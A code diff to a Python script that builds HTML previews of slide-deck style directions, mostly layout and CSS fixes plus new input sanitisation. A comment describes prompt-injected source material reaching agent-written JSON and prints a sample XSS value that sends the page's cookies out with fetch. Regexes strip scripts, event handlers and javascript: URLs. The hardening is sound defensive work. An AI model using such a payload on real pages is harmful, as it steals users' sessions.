@@ -28,7 +28,7 @@ The 4 archetype slides per direction mirror archetypes.py exactly — cover, bul
 diagram pipeline, data/figure — so the HTML comparison is apples-to-apples with what ships.
 
 USAGE
-  python archetypes_html.py directions.json out.html ["Deck Title"]
+  python3 archetypes_html.py directions.json out.html ["Deck Title"]
 
 `directions.json` is a list of 2–4 direction objects. Each object (only `name` required;
 sensible defaults fill the rest):
@@ -51,6 +51,7 @@ the page renders the same offline (no webfont dependency).
 import html
 import json
 import os
+import re
 import sys
 
 _DEFAULTS = {
@@ -75,6 +76,8 @@ _DEFAULTS = {
     # `dna` name switch, so a bespoke direction renders a real style, not a motif-less colourway.
     "cover_motif": None,        # raw HTML: this bespoke register's signature motif on the cover
     "ambient_motif": None,      # raw HTML: its quiet register signature for interior slides
+    "vl": None,          # a curated visual language (visual_languages.direction)
+    "sample": None,      # its bundled style sample, a data:image/ URI
 }
 
 _COVERS = ("centred", "low-left", "split-vertical", "full-bleed-type")
@@ -86,12 +89,89 @@ _SKELETONS = ("statement", "split", "island", "band", "rail", "dashboard", "full
 _SKELETON_PREVIEW = {"dashboard": "split", "full-bleed": "statement", "gallery": "split"}
 
 
+# ── preview hardening ────────────────────────────────────────────────────────────────────────
+# The preview is an HTML file the USER opens in their own browser, and every field in it comes out
+# of `directions.json`, which the agent authors while reading the user's source material. A
+# prompt-injected paper or deck can therefore reach these values. Text already went through
+# `_esc()`; COLOURS did not, and they are interpolated into `style="…"` attributes in ~86 places,
+# so a value like `#fff" onmouseover="fetch('http://x/'+document.cookie)` broke out of the
+# attribute. Normalising HERE, at the one function every direction passes through, fixes all of
+# them at once — editing 86 f-strings would leave the 87th.
+_COLOUR_OK = re.compile(
+    r"^(#[0-9a-fA-F]{3,8}"                                  # #rgb #rgba #rrggbb #rrggbbaa
+    r"|rgba?\(\s*[\d.]+%?(\s*[, ]\s*[\d.]+%?){2,3}\s*\)"    # rgb()/rgba()
+    r"|hsla?\(\s*[\d.]+(deg)?(\s*[, ]\s*[\d.]+%?){2,3}\s*\)"
+    r"|[a-zA-Z]{3,20})$")                                   # a CSS colour keyword
+_COLOUR_KEYS = ("bg", "ink", "grey", "mute", "line", "light", "accent")
+# CSS font-family lists are also attribute-interpolated. Allow the shapes a font stack really has.
+_FONT_OK = re.compile(r"^[\w \-,'\"]{1,120}$")
+
+# `cover_motif` / `ambient_motif` are RAW HTML **by design** — a bespoke register draws its own
+# signature (SVG, styled divs) and the 5.0.0 direction-gate structure check requires at most one
+# motif-less colourway, so escaping them outright would delete the capability the gate demands.
+# What is stripped is only what can EXECUTE: script/iframe/object/embed elements, on* handlers,
+# and javascript:/vbscript:/data:text-html URLs. Shape and colour survive; behaviour does not.
+# Whole ELEMENT including its body: stripping only the tags left the script's source visible as
+# page text ("alert(3)"), which is inert but relies on the tag-strip having caught every opener.
+# Removing the element outright means a missed variant leaks nothing readable either.
+_KILL_BLOCK = re.compile(r"<\s*(script|style|iframe|object|embed|form)\b[^>]*>.*?"
+                         r"<\s*/\s*\1\s*>", re.I | re.S)
+_KILL_EL = re.compile(r"<\s*/?\s*(script|style|iframe|object|embed|link|meta|base|form)\b[^>]*>",
+                      re.I)
+_KILL_ON = re.compile(r"\son[a-z]+\s*=\s*(\"[^\"]*\"|'[^']*'|[^\s>]+)", re.I)
+_KILL_URL = re.compile(r"(javascript|vbscript)\s*:|data\s*:\s*text/html", re.I)
+
+
+def _safe_colour(v, fallback, name, key, warn):
+    t = str(v).strip()
+    if _COLOUR_OK.match(t):
+        return t
+    warn.append(f"{name}.{key}={v!r}")
+    return fallback
+
+
+def sanitize_motif(html_frag):
+    """Strip the executable half of a bespoke register's raw-HTML motif. Public for the tests."""
+    if not html_frag:
+        return html_frag
+    out = _KILL_BLOCK.sub("", str(html_frag))
+    out = _KILL_EL.sub("", out)
+    out = _KILL_ON.sub("", out)
+    out = _KILL_URL.sub("blocked:", out)
+    return out
+
+
 def _norm(d):
     s = dict(_DEFAULTS)
     s.update({k: v for k, v in d.items() if v is not None})
     if not s.get("accents"):
         s["accents"] = [s["accent"]]
     s["name"] = d.get("name", "Direction")
+    warn = []
+    for k in _COLOUR_KEYS:
+        if k in s:
+            s[k] = _safe_colour(s[k], _DEFAULTS.get(k, "#333333"), s["name"], k, warn)
+    if isinstance(s.get("accents"), (list, tuple)):
+        s["accents"] = [_safe_colour(a, s["accent"], s["name"], "accents[]", warn)
+                        for a in s["accents"]]
+    for k in ("font_display", "font_body"):
+        if k in s and not _FONT_OK.match(str(s[k])):
+            warn.append(f"{s['name']}.{k}={s[k]!r}")
+            s[k] = _DEFAULTS[k]
+    if s.get("sample") and not _SAMPLE_OK.match(str(s["sample"])):
+        warn.append(f"{s['name']}.sample (not a data:image/ URI — dropped)")
+        s["sample"] = None
+    for k in ("cover_motif", "ambient_motif"):
+        if s.get(k):
+            cleaned = sanitize_motif(s[k])
+            if cleaned != s[k]:
+                warn.append(f"{s['name']}.{k} (executable markup stripped)")
+            s[k] = cleaned
+    if warn:
+        # Loud, never silent: a rejected value means the preview is not showing what the
+        # directions file asked for, and the author needs to know which field was replaced.
+        print("archetypes_html: unsafe value(s) replaced before rendering the preview — "
+              + "; ".join(warn[:8]), file=sys.stderr)
     # An unknown value must not silently fall back to the default — that would make the gate
     # claim a composition it did not render. Fail loudly instead.
     if s["cover"] not in _COVERS:
@@ -221,7 +301,7 @@ def _dna_cover(S):
         dots = "".join(
             f'<span class="dna-m-dot" style="left:{lx}%;top:{ty}%;background:{_c(i%3,a)};'
             f'border-radius:{"50%" if i%2 else "0"}"></span>'
-            for i, (lx, ty) in enumerate([(6, 12), (88, 8), (92, 82), (5, 84), (78, 90)]))
+            for i, (lx, ty) in enumerate([(6, 12), (88, 8), (92, 82), (50, 7), (78, 90)]))
         return f'<div class="dna-memphis">{dots}<span class="dna-m-zig" style="border-color:{_c(1,a)}"></span></div>'
     if d == "glassmorphism":
         return (f'<div class="dna-glow" style="background:{_c(0,a)}"></div>'
@@ -310,8 +390,18 @@ def _dna_ambient(S):
     return f'<div class="dna-amb dna-amb-{d}">{inner}</div>'
 
 
+_SAMPLE_OK = re.compile(r"^data:image/(?:png|jpeg|webp);base64,[A-Za-z0-9+/=]+$")
+
+
 def _slide_cover(S, deck_title="Deck Title"):
     name = S["name"]
+    if S.get("sample"):
+        # a curated visual language previews as its REAL rendered sample, labelled so nobody mistakes
+        # the sample's photographs and copy for their own deck
+        return f'''<div class="slide cover cov-sample" style="background:{S['bg']};padding:0">
+      <img src="{S['sample']}" alt="style sample of {_esc(name)}" style="width:100%;height:100%;object-fit:contain;display:block">
+      <div class="cover-tag" style="color:{S['ink']};background:rgba(255,255,255,.85);padding:2px 6px">Style sample — not your content · 风格样张，不是你的内容 · Direction: {_esc(name)}</div>
+    </div>'''
     # Faithful cover: a DARK deck gets a dark cover (its bg + light ink title); a LIGHT deck gets
     # a bold inverted cover (ink panel + light title). Avoids the inverted/low-contrast preview bug.
     if _is_dark(S["bg"]):
@@ -326,7 +416,9 @@ def _slide_cover(S, deck_title="Deck Title"):
     panel = (f'<div class="cover-panel" style="background:{S["accent"]}"></div>'
              if comp == "split-vertical" else "")
     dna = _dna_cover(S)
-    return f'''<div class="slide cover cov-{comp} dna-{S.get("dna") or "none"}" style="background:{cbg}">
+    # the cover's style marker is `look-<preset>`, never `dna-<preset>`: memphis's motif container IS `.dna-memphis`
+    # (position:absolute; inset:0), so the old marker pulled every memphis cover out of its slide over the whole page
+    return f'''<div class="slide cover cov-{comp} look-{S.get("dna") or "none"}" style="background:{cbg}">
       {dna}{bar}{panel}
       <div class="cover-body">
         <div class="cover-ttl" style="color:{tt}">{_esc(deck_title)}</div>
@@ -481,7 +573,11 @@ def _direction_block(S, idx, deck_title="Deck Title"):
     rat = f' — <span class="rat">{_esc(S["rationale"])}</span>' if S["rationale"] else ""
     fonts = (f'<span class="fmeta">display: {_esc(S["font_display"].split(",")[0])} · '
              f'body: {_esc(S["font_body"].split(",")[0])} · {_esc(S["density"])}</span>')
-    slides = (_slide_cover(S, deck_title) + _slide_bullets(S) + _slide_diagram(S) + _slide_data(S))
+    # each slide is laid out at ONE design size (560x315) and scaled to its cell — like a picture — so the page shows
+    # the same composition at every window width; with px type and %-placed motifs, a narrow cell had moved the
+    # motifs onto the words (tests/test_direction_cover_legibility.py probes two widths)
+    slides = "".join('<div class="slide-cell"><div class="slide-stage">{}</div></div>'.format(x) for x in (
+        _slide_cover(S, deck_title), _slide_bullets(S), _slide_diagram(S), _slide_data(S)))
     # Per-direction font scoping via a wrapper class + inline custom props.
     return f'''<section class="dir" id="dir-{letter}" style="--fd:{S['font_display']};--fb:{S['font_body']}">
       <div class="dir-head">
@@ -522,6 +618,12 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-s
 @media(max-width:900px){.grid{grid-template-columns:1fr}}
 
 /* a slide card — fixed 16:9, internal sizes tuned to that box */
+/* a fluid cell holds a FIXED 560px stage: the slide's %-paddings resolve against its containing block, so the stage
+   (not the cell) must be the 560px box; the stage is scaled to the cell by fitSlides() */
+.slide-cell{position:relative;aspect-ratio:16/9;border-radius:8px;overflow:hidden;
+  box-shadow:0 1px 0 rgba(0,0,0,.4),0 6px 22px rgba(0,0,0,.28)}
+.slide-stage{position:absolute;left:0;top:0;width:560px;height:315px;transform-origin:0 0}
+.slide-stage>.slide{width:560px;height:315px;box-shadow:none;border-radius:0}
 .slide{position:relative;aspect-ratio:16/9;border-radius:8px;overflow:hidden;
   box-shadow:0 1px 0 rgba(0,0,0,.4),0 6px 22px rgba(0,0,0,.28);
   padding:22px 26px;font-family:var(--fb)}
@@ -540,10 +642,13 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-s
 .co-body{color:#fff;font-size:13px;font-weight:500}
 .cover{display:flex;flex-direction:column;justify-content:center}
 .accentbar{position:absolute;left:0;top:0;bottom:0;width:10px}
-.cover-body{padding-left:8px}
+/* the cover's words sit ABOVE every style motif: a motif is positioned, so it painted over a static title —
+   the glassmorphism pane blurred a split-vertical title, and grids, frames and shapes crossed nine presets' titles
+   (tests/test_direction_cover_legibility.py) */
+.cover-body{padding-left:8px;position:relative;z-index:2}
 .cover-ttl{font-family:var(--fd);font-size:32px;font-weight:800;letter-spacing:-.01em}
 .cover-sub{font-size:15px;margin-top:9px}
-.cover-tag{position:absolute;left:26px;bottom:20px;font-size:11px;letter-spacing:.04em}
+.cover-tag{position:absolute;left:26px;bottom:20px;font-size:11px;letter-spacing:.04em;z-index:2}
 .pipe{display:flex;align-items:center;gap:7px;margin-top:24px}
 .chip{flex:1;border-radius:7px;padding:13px 10px;color:#fff;min-width:0}
 .chip-t{font-weight:700;font-size:14px}
@@ -692,6 +797,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-s
 .dna-glow2{left:-40px;bottom:-60px;right:auto;top:auto;opacity:.4}
 .dna-glass{position:absolute;right:8%;top:26%;width:150px;height:96px;border-radius:14px;
   background:rgba(255,255,255,.10);border:1px solid rgba(255,255,255,.22);backdrop-filter:blur(6px)}
+
 .dna-grid{position:absolute;inset:0;opacity:.5;
   background-image:linear-gradient(#12365a 1px,transparent 1px),linear-gradient(90deg,#12365a 1px,transparent 1px);
   background-size:34px 34px}
@@ -710,8 +816,32 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-s
 /* mid-century — starburst + atomic orbit */
 .dna-starburst{position:absolute;right:9%;top:16%;width:0;height:0}
 .dna-ray{position:absolute;width:56px;height:2px;transform-origin:0 50%;opacity:.85}
-.dna-atom{position:absolute;left:6%;bottom:12%;width:70px;height:34px;border:2px solid;
+.dna-atom{position:absolute;left:6%;top:10%;width:70px;height:34px;border:2px solid;
   border-radius:50%;transform:rotate(-20deg);opacity:.7}
+/* ── every cover motif keeps OFF the words, on every cover composition ──────────────────────────────────────
+   Each motif was placed for its preset's own default cover; on another composition it crossed the title (the
+   glass pane, the bauhaus shapes, dark_tech's near-white island under a light title, the editorial hairline
+   striking through it, …). The words sit in the middle band (centred, full-bleed-type), the right half
+   (split-vertical) or the lower left (low-left): motifs go to the top band, the colour panel or the upper half.
+   tests/test_direction_cover_legibility.py measures every motif against every word's ink box. */
+.cov-split-vertical .dna-glass{right:auto;left:9%;top:24%}
+.cov-centred .dna-glass,.cov-full-bleed-type .dna-glass{top:7%;right:5%;width:118px;height:74px}
+.cov-centred .dna-hair,.cov-full-bleed-type .dna-hair{top:15%}
+.cov-centred .dna-hair2,.cov-full-bleed-type .dna-hair2{top:calc(15% + 8px)}
+.cov-split-vertical .dna-hair{left:46%;top:15%}
+.cov-split-vertical .dna-hair2{left:46%;top:calc(15% + 8px)}
+.cov-split-vertical .dna-island{right:auto;left:6%;top:28%}
+.cov-centred .dna-island,.cov-full-bleed-type .dna-island{top:6%;right:5%;width:110px;height:64px}
+.cov-split-vertical .dna-bh-c{right:auto;left:7%;top:12%}
+.cov-split-vertical .dna-bh-t{right:auto;left:20%;top:52%}
+.cov-split-vertical .dna-bh-s{right:auto;left:10%;top:70%}
+.cov-centred .dna-bh-c,.cov-full-bleed-type .dna-bh-c{top:5%;right:6%;width:58px;height:58px}
+.cov-centred .dna-bh-t,.cov-full-bleed-type .dna-bh-t{top:6%;right:24%;border-left-width:22px;border-right-width:22px;
+  border-bottom-width:38px}
+.cov-centred .dna-bh-s,.cov-full-bleed-type .dna-bh-s{top:7%;right:16%;width:40px;height:40px}
+.cov-full-bleed-type .dna-starburst{top:7%;right:6%}
+.cov-full-bleed-type .dna-ray{width:34px}
+.cov-centred .dna-riso,.cov-full-bleed-type .dna-riso{top:5%}
 /* terminal — scanlines + prompt */
 .dna-scan{position:absolute;inset:0;pointer-events:none;opacity:.5;
   background:repeating-linear-gradient(180deg,rgba(120,255,150,.05) 0 1px,transparent 1px 3px)}
@@ -825,6 +955,12 @@ def build_directions_html(directions, out_path, deck_title="Your Deck"):
     }}
   }}
   function copyAgain(){{ copyText(document.getElementById('cbarText').value); }}
+  function fitSlides(){{
+    document.querySelectorAll('.slide-cell').forEach(function(f){{
+      var s = f.firstElementChild; if (s) s.style.transform = 'scale(' + (f.clientWidth / 560) + ')';
+    }});
+  }}
+  fitSlides(); window.addEventListener('load', fitSlides); window.addEventListener('resize', fitSlides);
   function pick(letter, name){{
     document.querySelectorAll('.dir').forEach(function(d){{ d.classList.remove('selected'); }});
     var el = document.getElementById('dir-' + letter);
@@ -844,9 +980,16 @@ def build_directions_html(directions, out_path, deck_title="Your Deck"):
     return out_path
 
 
+try:                                            # console safety: a legacy code page must
+    from _console import safe_stdio             # degrade a tick, never kill the report
+    safe_stdio()
+except Exception:
+    pass
+
+
 if __name__ == "__main__":
     if len(sys.argv) < 3:
-        print("usage: python archetypes_html.py directions.json out.html [\"Deck Title\"]")
+        print("usage: python3 archetypes_html.py directions.json out.html [\"Deck Title\"]")
         raise SystemExit(2)
     with open(sys.argv[1], encoding="utf-8") as f:
         dirs = json.load(f)
